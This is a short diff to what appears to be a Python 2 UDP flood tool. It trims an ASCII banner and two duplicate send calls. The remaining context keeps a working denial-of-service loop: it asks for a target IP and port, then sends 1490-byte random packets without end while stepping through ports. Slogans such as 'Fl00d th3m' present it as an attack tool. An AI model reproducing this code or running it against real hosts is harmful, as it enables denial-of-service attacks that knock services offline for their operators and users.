@@ -15,17 +15,8 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 os.system("clear")
-print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
-print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
-print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
-print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
-print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
-print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
-print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
-print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
-print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
-print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
-print "\n\nTeach them whos the boss - All Hail Hatsune Miku - Fl00d th3m"
+
+print "\n\n\n\n\nTeach them whos the boss - All Hail Hatsune Miku - Fl00d th3m"
 print "#H4ck 4ll 7he 7h1ng - F1ght f0r Anime - K1ll th3m"
 ip = raw_input('Enter T@rget 1P: ')
 port = input('Choose a  P0rt: ')
@@ -34,8 +25,6 @@ time.sleep(3)
 print
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
-     sock.sendto(bytes, (ip,port))
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
